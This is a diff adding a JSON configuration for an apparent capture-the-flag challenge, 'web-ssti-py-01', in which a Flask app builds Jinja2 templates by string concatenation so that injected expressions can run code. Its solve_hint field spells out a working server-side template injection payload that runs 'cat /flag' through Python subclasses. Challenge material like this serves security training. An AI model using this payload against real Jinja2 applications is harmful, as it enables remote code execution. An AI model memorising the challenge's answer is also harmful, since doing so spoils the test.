@@ -1,0 +1,17 @@
+{
+  "component_type": "INSTANCE",
+  "id": "web-ssti-py-01",
+  "name": "Server-Side Template Injection (Jinja2)",
+  "category": "web",
+  "difficulty": "medium",
+  "description": "Flask 用字符串拼接方式渲染模板，可注入 Jinja2 表达式，通过 RCE 读取 flag",
+  "requirements": {
+    "compose_model": "web-python"
+  },
+  "flag_injection": {
+    "file": "src/app.py",
+    "placeholder": "FLAG_PLACEHOLDER",
+    "note": "flag 通过 FLAG 环境变量传入"
+  },
+  "solve_hint": "?name={{config}} 确认漏洞，?name={{''.__class__.__mro__[1].__subclasses__()[xxx]('cat /flag',shell=True,stdout=-1).communicate()[0].decode()}}"
+}
